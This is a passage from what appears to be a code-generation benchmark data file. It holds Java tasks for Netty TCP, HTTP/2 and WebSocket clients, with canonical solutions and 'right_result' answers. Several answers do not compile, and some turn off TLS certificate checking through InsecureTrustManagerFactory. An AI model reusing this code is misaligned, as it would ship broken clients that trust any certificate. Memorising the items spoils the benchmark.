UpgradeRequestHandler extends ChannelInboundHandlerAdapter {\n            @Override\n            public void channelActive(ChannelHandlerContext ctx) throws Exception {\n                DefaultFullHttpRequest upgradeRequest =\n                        new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, \"/sdf\");\n                upgradeRequest.headers().add(\"Host\", \"default\");\n                ctx.writeAndFlush(upgradeRequest);\n                ctx.fireChannelActive();\n                ctx.pipeline().remove(this);\n                configureEndOfPipeline(ctx.pipeline());\n            }\n        }\n\n        private static class UserEventLogger extends ChannelInboundHandlerAdapter {\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n                ctx.fireUserEventTriggered(evt);\n            }\n        }\n    }\n\n    static class Http2SettingsHandler extends SimpleChannelInboundHandler<Http2Settings> {\n        private final ChannelPromise promise;\n\n        Http2SettingsHandler(ChannelPromise promise) {\n            this.promise = promise;\n        }\n\n        public void awaitSettings(long timeout, TimeUnit unit) throws Exception {\n            if (!promise.awaitUninterruptibly(timeout, unit)) {\n                throw new IllegalStateException(\"Timed out waiting for settings\");\n            }\n            if (!promise.isSuccess()) {\n                throw new RuntimeException(promise.cause());\n            }\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Http2Settings msg) throws Exception {\n            promise.setSuccess();\n            ctx.pipeline().remove(this);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http2.*;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\n\npublic class NettyHttp2Client {\n    private final NioEventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final Http2ClientInitializer initializer = new Http2ClientInitializer();\n    private final Bootstrap bootstrap = new Bootstrap();\n    private Channel channel;\n\n    public NettyHttp2Client(String host, int port) {\n        configureBootstrap(host, port);\n    }\n\n    private void configureBootstrap(String host, int port) {\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .handler(initializer);\n    }\n\n    public void connect() throws Exception {\n        channel = bootstrap.connect(host, port).sync().channel();\n    }\n\n    public void sendRequest(URI uri) throws Exception {\n        FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, uri.getRawPath());\n        request.headers().set(HttpHeaderNames.HOST, \"localhost\");\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.UPGRADE);\n        request.headers().set(HttpHeaderNames.UPGRADE, \"h2c\");\n        request.headers().set(HttpHeaderNames.KEEP_ALIVE, String.valueOf(60));\n        request.headers().set(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n\n        channel.writeAndFlush(request).sync();\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close();\n        }\n        workerGroup.shutdownGracefully();\n    }\n\n    public static class Http2ClientInitializer extends ChannelInitializer<SocketChannel> {\n        private final SslContext sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                .build();\n\n        @Override\n        protected void initChannel(SocketChannel ch) throws Exception {\n            ChannelPipeline p = ch.pipeline();\n\n            p.addLast(\"ssl\", sslCtx.newHandler(ch.alloc(), \"localhost\", 8443));\n            p.addLast(new HttpClientCodec());\n            p.addLast(new HttpObjectAggregator(8192));\n            p.addLast(new UserEventLogger());\n            p.addLast(new UpgradeRequestHandler());\n            p.addLast(new Http2SettingsHandler());\n            p.addLast(new SimpleHttp2ClientHandler());\n        }\n    }\n\n    public static class Http2SettingsHandler extends SimpleChannelInboundHandler<Http2Settings> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Http2Settings msg) throws Exception {\n            // Handle HTTP/2 settings\n        }\n    }\n\n    public static class UpgradeRequestHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof HttpUpgradeEvent) {\n                HttpUpgradeEvent e = (HttpUpgradeEvent) evt;\n                ChannelPipeline pipeline = ctx.pipeline();\n                pipeline.remove(HttpClientCodec.class);\n                pipeline.remove(HttpObjectAggregator.class);\n                pipeline.addLast(new Http2ClientHandler());\n            } else {\n                super.userEventTriggered(ctx, evt);\n            }\n        }\n    }\n\n    public static class UserEventLogger extends ChannelInboundHandlerAdapter {\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            System.out.println(\"User event triggered: \" + evt);\n            super.userEventTriggered(ctx, evt);\n        }\n    }\n\n    public static class SimpleHttp2ClientHandler extends SimpleChannelInboundHandler<Http2DataFrame> {\n        private final CountDownLatch latch = new CountDownLatch(1);\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Http2DataFrame msg) throws Exception {\n            ByteBuf content = msg.content();\n            byte[] bytes = new byte[content.readableBytes()];\n            content.getBytes(0, bytes);\n            System.out.println(\"Received data: \" + new String(bytes));\n            content.release();\n            latch.countDown();\n        }\n\n        public void awaitResponse() throws InterruptedException {\n            latch.await();\n        }\n    }\n\n    public static class Http2ClientHandler extends Http2MultiplexHandler {\n        @Override\n        protected StreamChannel newStreamChannel(ChannelHandlerContext ctx, Http2Stream stream, boolean inbound) {\n            return super.newStreamChannel(ctx, stream, inbound);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 148,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send protocol messages, and handle responses.\n\nClass Description: ProtocolClient is a Netty-based TCP client that connects to a specified host and port, sends custom protocol messages at regular intervals, and handles server responses. The client uses custom encoders/decoders for protocol message processing and maintains the connection until explicitly stopped.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server\n- MAX_FRAME_LENGTH: int (static final) - Maximum allowed frame length for messages (1MB)\n- LENGTH_FIELD_LENGTH: int (static final) - Length of the length field in protocol header (4 bytes)\n- LENGTH_FIELD_OFFSET: int (static final) - Offset of the length field in protocol header (6 bytes)\n- LENGTH_ADJUSTMENT: int (static final) - Adjustment value for the length field (0)\n- INITIAL_BYTES_TO_STRIP: int (static final) - Number of initial bytes to strip (0)\n\nMethods:\n- ProtocolClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- run() throws InterruptedException -> void - Main method that configures and starts the Netty client, establishes connection, and sends periodic messages\n  - Input: None\n  - Output: None (continuously runs until interrupted)\n  - Side effects: Creates network connection, sends messages every 2 seconds, handles responses\n  - Throws: InterruptedException if thread sleep is interrupted",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class ProtocolClient {\n\n    private String host;\n    private int port;\n\n    private static final int MAX_FRAME_LENGTH = 1024 * 1024;\n    private static final int LENGTH_FIELD_LENGTH = 4;\n    private static final int LENGTH_FIELD_OFFSET = 6;\n    private static final int LENGTH_ADJUSTMENT = 0;\n    private static final int INITIAL_BYTES_TO_STRIP = 0;\n\n    public ProtocolClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\n                            \"decoder\",\n                            new ProtocolDecoder(MAX_FRAME_LENGTH,\n                                    LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH,\n                                    LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                    ch.pipeline().addLast(\"encoder\", new ProtocolEncoder());\n                    ch.pipeline().addLast(new ProtocolClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                ProtocolMsg msg = new ProtocolMsg();\n                ProtocolHeader protocolHeader = new ProtocolHeader();\n                protocolHeader.setMagic((byte) 0x01);\n                protocolHeader.setMsgType((byte) 0x01);\n                protocolHeader.setReserve((short) 0);\n                protocolHeader.setSn((short) 0);\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\u7591\u662f\u5730\u4e0a\u971c\";\n                StringBuffer sb = new StringBuffer();\n                for (int i = 0; i < 2700; i++) {\n                    sb.append(body);\n                }\n\n                byte[] bodyBytes = sb.toString().getBytes(\n                        Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                protocolHeader.setLen(bodySize);\n\n                msg.setProtocolHeader(protocolHeader);\n                msg.setBody(sb.toString());\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class ProtocolClient {\n    private final String host;\n    private final int port;\n    static final int MAX_FRAME_LENGTH = 1024 * 1024; // 1MB\n    static final int LENGTH_FIELD_LENGTH = 4;\n    static final int LENGTH_FIELD_OFFSET = 6;\n    static final int LENGTH_ADJUSTMENT = 0;\n    static final int INITIAL_BYTES_TO_STRIP = 0;\n\n    public ProtocolClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new LengthFieldBasedFrameDecoder(\n                                    MAX_FRAME_LENGTH,\n                                    LENGTH_FIELD_OFFSET,\n                                    LENGTH_FIELD_LENGTH,\n                                    LENGTH_ADJUSTMENT,\n                                    INITIAL_BYTES_TO_STRIP\n                            ));\n                            pipeline.addLast(new LengthFieldPrepender(LENGTH_FIELD_LENGTH));\n                            pipeline.addLast(new ClientHandler());\n                            pipeline.addLast(new IdleStateHandler(0, 2, 0, TimeUnit.SECONDS));\n                        }\n                    });\n\n            Channel channel = bootstrap.connect(host, port).sync().channel();\n\n            while (true) {\n                ByteBuf message = channel.alloc().buffer();\n                message.writeBytes(\"Hello Server\".getBytes());\n                channel.writeAndFlush(message);\n                Thread.sleep(2000);\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class ClientHandler extends SimpleChannelInboundHandler<ByteBuf> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) {\n            byte[] bytes = new byte[msg.readableBytes()];\n            msg.readBytes(bytes);\n            System.out.println(\"Received from server: \" + new String(bytes));\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 149,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client capable of establishing WebSocket connections with support for SSL/TLS, SOCKS proxy, message compression, and idle connection handling.\n\nClass Description: The NettyTcpClient class provides functionality to connect to a WebSocket server using Netty's asynchronous event-driven network framework. It handles connection establishment, SSL/TLS encryption, proxy configuration, message processing, and graceful shutdown.\n\nAttributes:\n- LOG: Logger - Logger instance for logging events and errors\n- uri: URI - The target WebSocket server URI\n- webSocketChannel: Channel - The active WebSocket channel\n- eventLoopGroup: NioEventLoopGroup - Manages client-side I/O threads\n- compressedMessages: boolean - Flag for enabling message compression\n- acceptAllCertificates: boolean - Flag for accepting all SSL certificates\n- enableLoggingHandler: boolean - Flag for enabling Netty's logging handler\n- loggingHandlerLevel: LogLevel - Logging level for Netty's logging handler\n- socksProxyHost: String - SOCKS proxy host address\n- socksProxyPort: Integer - SOCKS proxy port number\n\nMethods:\n- connect(): void - Establishes a WebSocket connection to the specified URI with configured options\n- disconnect(): void - Closes the WebSocket connection and releases resources\n- getWebSocketClientExtensionHandler(): WebSocketClientExtensionHandler -> WebSocketClientExtensionHandler - Returns the WebSocket extension handler (defaults to compression handler)\n- getWebSocketClientHandler(WebSocketClientHandshaker, WebSocketClientHandler.WebSocketMessageHandler): WebSocketClientHandler -> WebSocketClientHandler - Creates and returns a custom WebSocket client handler with ping/pong and channel state management",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.handler.codec.http.websocketx.extensions.WebSocketClientExtensionHandler;\nimport io.netty.handler.codec.http.websocketx.extensions.compression.WebSocketClientCompressionHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.proxy.Socks5ProxyHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.internal.SocketUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.URI;\nimport java.time.Duration;\n\npublic class NettyTcpClient {\n\n    private static final Logger LOG = LoggerFactory.getLogger(NettyTcpClient.class);\n    private static final Duration DEFAULT_CONNECTION_TIMEOUT = Duration.ofSeconds(10);\n    private static final int DEFAULT_IDLE_TIMEOUT = 15;\n\n    private URI uri;\n    private Channel webSocketChannel;\n    private NioEventLoopGroup eventLoopGroup;\n    private boolean compressedMessages = false;\n    private boolean acceptAllCertificates = false;\n    private boolean enableLoggingHandler = false;\n    private LogLevel loggingHandlerLevel = LogLevel.DEBUG;\n    private String socksProxyHost;\n    private Integer socksProxyPort;\n\n    public void connect() {\n        try {\n            String scheme = uri.getScheme() == null ? \"ws\" : uri.getScheme();\n            String host = uri.getHost();\n            if (host == null) {\n                throw new IllegalArgumentException(\"Host cannot be null.\");\n            }\n\n            final int port = uri.getPort() == -1 ? \n                (\"ws\".equalsIgnoreCase(scheme) ? 80 : 443) : uri.getPort();\n\n            final boolean ssl = \"wss\".equalsIgnoreCase(scheme);\n            final SslContext sslCtx = ssl ? \n                SslContextBuilder.forClient()\n                    .trustManager(acceptAllCertificates ? InsecureTrustManagerFactory.INSTANCE : null)\n                    .build() : null;\n\n            WebSocketClientHandler handler = getWebSocketClientHandler(\n                WebSocketClientHandshakerFactory.newHandshaker(\n                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), 65536),\n                message -> {});\n\n            if (eventLoopGroup == null || eventLoopGroup.isShutdown()) {\n                eventLoopGroup = new NioEventLoopGroup(2);\n            }\n\n            new Bootstrap()\n                .group(eventLoopGroup)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, \n                    (int) DEFAULT_CONNECTION_TIMEOUT.toMillis())\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline p = ch.pipeline();\n                        if (socksProxyHost != null) {\n                            p.addLast(new Socks5ProxyHandler(\n                                SocketUtils.socketAddress(socksProxyHost, socksProxyPort)));\n                        }\n                        if (sslCtx != null) {\n                            p.addLast(sslCtx.newHandler(ch.alloc(), host, port));\n                        }\n                        p.addLast(new HttpClientCodec());\n                        if (enableLoggingHandler) {\n                            p.addLast(new LoggingHandler(loggingHandlerLevel));\n                        }\n                        if (compressedMessages) {\n                            p.addLast(WebSocketClientCompressionHandler.INSTANCE);\n                        }\n                        p.addLast(new HttpObjectAggregator(8192));\n                        if (DEFAULT_IDLE_TIMEOUT > 0) {\n                            p.addLast(new IdleStateHandler(DEFAULT_IDLE_TIMEOUT, 0, 0));\n                        }\n                        WebSocketClientExtensionHandler clientExtensionHandler = \n                            getWebSocketClientExtensionHandler();\n                        if (clientExtensionHandler != null) {\n                            p.addLast(clientExtensionHandler);\n                        }\n                        p.addLast(handler);\n                    }\n                })\n                .connect(uri.getHost(), port)\n                .addListener((ChannelFuture channelFuture) -> {\n                    webSocketChannel = channelFuture.channel();\n                    if (!channelFuture.isSuccess()) {\n                        LOG.error(\"Connection failed\", channelFuture.cause());\n                    }\n                });\n        } catch (Exception e) {\n            LOG.error(\"Connection error\", e);\n        }\n    }\n\n    public void disconnect() {\n        if (webSocketChannel != null) {\n            webSocketChannel.close();\n        }\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully(2, DEFAULT_IDLE_TIMEOUT, TimeUnit.SECONDS);\n        }\n    }\n\n    protected WebSocketClientExtensionHandler getWebSocketClientExtensionHandler() {\n        return WebSocketClientCompressionHandler.INSTANCE;\n    }\n\n    protected WebSocketClientHandler getWebSocketClientHandler(\n        WebSocketClientHandshaker handshaker,\n        WebSocketClientHandler.WebSocketMessageHandler handler) {\n        return new WebSocketClientHandler(handshaker, handler) {\n            @Override\n            public void channelInactive(ChannelHandlerContext ctx) {\n                LOG.info(\"Channel inactive\");\n                ctx.close();\n            }\n\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n                if (evt instanceof IdleStateEvent) {\n                    IdleStateEvent e = (IdleStateEvent) evt;\n                    if (e.state() == IdleState.READER_IDLE) {\n                        ctx.writeAndFlush(new PingWebSocketFrame());\n                    }\n                }\n            }\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.compression.ZlibCodecFactory;\nimport io.netty.handler.codec.compression.ZlibWrapper;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.websocketx.*;\nimport io.netty.handler.proxy.Socks5ProxyHandler;\nimport io.netty.handler.ssl.*;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.CharsetUtil;\n\nimport javax.net.ssl.SSLException;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.URI;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class NettyTcpClient {\n    private static final Logger LOG = Logger.getLogger(NettyTcpClient.class.getName());\n    private final URI uri;\n    private Channel webSocketChannel;\n    private final NioEventLoopGroup eventLoopGroup = new NioEventLoopGroup();\n    private boolean compressedMessages = false;\n    private boolean acceptAllCertificates = true;\n    private boolean enableLoggingHandler = false;\n    private Level loggingHandlerLevel = Level.INFO;\n    private String socksProxyHost = null;\n    private Integer socksProxyPort = null;\n\n    public NettyTcpClient(URI uri) {\n        this.uri = uri;\n    }\n\n    public void connect() throws Exception {\n        try {\n            String scheme = uri.getScheme() == null ? \"ws\" : uri.getScheme();\n            int port = uri.getPort();\n            if (port == -1) {\n                if (\"ws\".equalsIgnoreCase(scheme)) {\n                    port = 80;\n                } else if (\"wss\".equalsIgnoreCase(scheme)) {\n                    port = 443;\n                }\n            }\n\n            boolean ssl = \"wss\".equalsIgnoreCase(scheme);\n            final String host = uri.getHost();\n            final String path = uri.getRawPath() != null ? uri.getRawPath() : \"/\";\n            final String query = uri.getRawQuery() != null ? \"?\" + uri.getRawQuery() : \"\";\n\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(eventLoopGroup)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 5000)\n                    .option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);\n\n            if (socksProxyHost != null && socksProxyPort != null) {\n                Socks5ProxyHandler proxyHandler = new Socks5ProxyHandler(\n                        new InetSocketAddress(socksProxyHost, socksProxyPort));\n                bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(proxyHandler);\n                    }\n                });\n            } else {\n                bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n\n                        if (enableLoggingHandler) {\n                            pipeline.addLast(new LoggingHandler(loggingHandlerLevel));\n                        }\n\n                        if (ssl) {\n                            SslContext sslCtx;\n                            try {\n                                if (acceptAllCertificates) {\n                                    sslCtx = SslContextBuilder.forClient()\n                                            .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                                } else {\n                                    sslCtx = SslContextBuilder.forClient().build();\n                                }\n                            } catch (SSLException e) {\n                                throw new RuntimeException(e);\n                            }\n                            SslHandler sslHandler = sslCtx.newHandler(ch.alloc(), host, port);\n                            pipeline.addLast(\"ssl\", sslHandler);\n                        }\n\n                        pipeline.addLast(new IdleStateHandler(60, 30, 0));\n\n                        HttpHeaders headers = new DefaultHttpHeaders();\n                        headers.set(HttpHeaderNames.HOST, host + \":\" + port);\n                        headers.set(HttpHeaderNames.CONNECTION, HttpHeaderValues.UPGRADE);\n                        headers.set(HttpHeaderNames.UPGRADE, HttpHeaderValues.WEBSOCKET);\n                        headers.set(HttpHeaderNames.SEC_WEBSOCKET_VERSION, \"13\");\n\n                        String subprotocols = \"chat\";\n                        headers.set(HttpHeaderNames.SEC_WEBSOCKET_PROTOCOL, subprotocols);\n\n                        String key = WebSocketClientHandshaker.generateKey();\n                        headers.set(HttpHeaderNames.SEC_WEBSOCKET_KEY, key);\n\n                        pipeline.addLast(new HttpClientCodec());\n                        pipeline.addLast(new HttpObjectAggregator(8192));\n                        pipeline.addLast(new WebSocketClientProtocolHandler(\n                                new WebSocketClientHandshakerFactory().newHandshaker(\n                                        new DefaultWebSocketUri(uri.toString()),\n                                        WebSocketVersion.V13,\n                                        subprotocols,\n                                        true,\n                                        headers,\n                                        65536),\n                                true));\n\n                        if (compressedMessages) {\n                            pipeline.addLast(getWebSocketClientExtensionHandler());\n                        }\n\n                        pipeline.addLast(getWebSocketClientHandler(\n                                new WebSocketClientHandshakerFactory().newHandshaker(\n                                        new DefaultWebSocketUri(uri.toString()),\n                                        WebSocketVersion.V13,\n                                        subprotocols,\n                                        true,\n                                        headers,\n                                        65536),\n                                new WebSocketMessageHandler()));\n                    }\n                });\n            }\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            webSocketChannel = future.channel();\n            webSocketChannel.closeFuture().sync();\n        } finally {\n            disconnect();\n        }\n    }\n\n    public void disconnect() {\n        if (webSocketChannel != null) {\n            webSocketChannel.close();\n        }\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully();\n        }\n    }\n\n    public WebSocketClientExtensionHandler getWebSocketClientExtensionHandler() {\n        return new WebSocketClientExtensionHandler(\n                ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP),\n                ZlibCodecFactory.newZlibEncoder(ZlibWrapper.GZIP));\n    }\n\n    public WebSocketClientHandler getWebSocketClientHandler(\n            WebSocketClientHandshaker handshaker,\n            WebSocketClientHandler.WebSocketMessageHandler messageHandler) {\n        return new WebSocketClientHandler(handshaker, messageHandler) {\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n                if (evt instanceof IdleStateEvent) {\n                    LOG.info(\"WebSocket connection idle, sending ping...\");\n                    ctx.writeAndFlush(new PingWebSocketFrame());\n                }\n                super.userEventTriggered(ctx, evt);\n            }\n        };\n    }\n\n    public interface WebSocketMessageHandler {\n        void onMessage(String message);\n        void onBinary(byte[] data);\n        void onClose(int statusCode, String reason);\n        void onError(Throwable cause);\n    }\n\n    private static class WebSocketClientHandler extends SimpleChannelInboundHandler<Object> {\n        private final WebSocketClientHandshaker handshaker;\n        private WebSocketClientMessageHandler messageHandler;\n\n        public WebSocketClientHandler(WebSocketClientHandshaker handshaker, WebSocketMessageHandler handler) {\n            this.handshaker = handshaker;\n            this.messageHandler = (WebSocketClientMessageHandler) handler;\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            handshaker.handshakeFuture().addListener((future) -> {\n                if (future.isSuccess()) {\n                    LOG.info(\"WebSocket Client connected!\");\n                } else {\n                    LOG.severe(\"WebSocket Client failed to connect: \" + future.cause());\n                    ctx.close();\n                }\n            });\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            LOG.info(\"WebSocket Client disconnected!\");\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            LOG.severe(\"WebSocket Client caught exception: \" + cause.getMessage());\n            ctx.close();\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) {\n            if (!handshaker.isHandshakeComplete()) {\n                handshaker.handleResponse(msg);\n                return;\n            }\n\n            if (msg instanceof TextWebSocketFrame) {\n                messageHandler.onMessage(((TextWebSocketFrame) msg).text());\n            } else if (msg instanceof BinaryWebSocketFrame) {\n                byte[] data = new byte[((BinaryWebSocketFrame) msg).content().readableBytes()];\n                ((BinaryWebSocketFrame) msg).content().readBytes(data);\n                messageHandler.onBinary(data);\n            } else if (msg instanceof CloseWebSocketFrame) {\n                CloseWebSocketFrame closeFrame = (CloseWebSocketFrame) msg;\n                messageHandler.onClose(closeFrame.statusCode(), closeFrame.reasonText());\n                ctx.close();\n            }\n        }\n\n        public static abstract class WebSocketClientMessageHandler implements WebSocketMessageHandler {\n            @Override\n            public void onBinary(byte[] data) {\n            }\n\n            @Override\n            public void onClose(int statusCode, String reason) {\n            }\n\n            @Override\n            public void onError(Throwable cause) {\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 15,
    "Instruction": "Task Description: Implement a thread-safe file storage class that provides efficient read/write operations using Java NIO's FileChannel with proper resource management and concurrency control.\n\nClass Description: CachedOpenFile is a storage implementation that manages file operations using FileChannel, providing thread-safe access through read-write locks. It supports reading and writing data blocks at specific offsets, capacity management, and ensures proper file handling.\n\nAttributes:\n- fc: FileChannel - The file channel used for all file operations\n- lock: ReadWriteLock - Provides thread-safe access control for file operations\n- capacity: long - The maximum capacity of the storage unit\n\nMethods:\n- Constructor: CachedOpenFile(Path file, long capacity) -> void - Initializes the file channel with given path and capacity, creating parent directories if needed\n- readBlock: readBlock(ByteBuffer buffer, long offset) -> int - Reads data from the specified offset into the buffer\n- writeBlock: writeBlock(ByteBuffer buffer, long offset) -> int - Writes data from the buffer to the specified offset\n- writeBlock: writeBlock(ByteBufferView buffer, long offset) -> int - Writes data from a ByteBufferView to the specified offset\n- capacity: capacity() -> long - Returns the maximum capacity of the storage\n- size: size() -> long - Returns the current size of the file\n- flush: flush() -> void - Forces any changes to be written to disk\n- lockForIoOperation: lockForIoOperation() -> void - Acquires a read lock for IO operations\n- unlockForIoOperation: unlockForIoOperation() -> void - Releases the read lock after IO operations\n- close: close() -> void - Closes the file channel and releases all resources\n- ensureOpen: ensureOpen() -> void - Private method to verify the file channel is open before operations",
